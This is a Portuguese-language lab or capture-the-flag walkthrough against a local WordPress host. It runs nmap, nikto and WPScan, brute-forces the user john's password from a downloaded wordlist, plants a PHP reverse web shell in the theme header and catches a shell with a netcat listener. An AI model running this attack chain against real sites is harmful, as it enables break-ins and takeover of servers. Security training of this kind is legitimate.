$ nmap -n -p 80 --open 192.168.0.189/24

Nmap scan report for 192.168.0.24
Host is up (0.00057s latency).

PORT   STATE SERVICE
80/tcp open  http

Executar o nikto para fazer um escaneamento na maquina alvo
$ nikto -h 192.168.0.24                
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.0.24
+ Target Hostname:    192.168.0.24
+ Target Port:        80
+ Start Time:         2024-04-09 20:49:50 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2140, size: 177, mtime: Sat Mar  3 16:17:59 2018. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /backup_wordpress/: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26.
+ /backup_wordpress/: Drupal Link header found with value: </backup_wordpress/?rest_route=/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /robots.txt: Entry '/backup_wordpress/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8910 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2024-04-09 20:50:02 (GMT-3) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


Vemos a url http://192.168.0.24/backup_wordpress/

e para acessar o painel administrativo do wordpress temos a pagina wp-login

---------------------------------------------------------------------------

Agora poderemos usar uma ferramenta para enumerar os usuarios existentes no sistema
wpscan --url http://192.168.0.24/backup_wordpress/ --enumerate u

[i] User(s) Identified:

[+] john
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)


Agora podemos baixar uma lista de nomes para fazer um ataque de força bruta
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt -o list.txt

Usaremos a lista de senhas no comando abaixo:
wpscan --url http://192.168.0.24/backup_wordpress/ --passwords list.txt --usernames "john"

usario encontrado: john e a senha é: enigma


Após entrar no painel acesse -> Appearance -> Edit Themes
Clique em Theme Header para inserir um cabeçalho em todas as paginas

pegamos o código do web shell php usado nas aulas anteriores
e copiamos na parte de cima do arquivo header

Como o web shell está apontando para a porta 443, executamos um netcat na porta 443

nc -nlvp 443

Depois salvamos o novo header com o webshell em cima, com o botão Update file
Pronto.

Ao acessar qualquer pagina do wordpress
http://192.168.0.24/backup_wordpress/

Será aberto um shell na linha de comando do netcat
└─$ nc -nlvp 443      
listening on [any] 443 ...
connect to [192.168.0.189] from (UNKNOWN) [192.168.0.24] 35015
Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 17:15:19 up 28 min,  0 users,  load average: 0.00, 0.15, 0.24
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls 
bin
boot
...




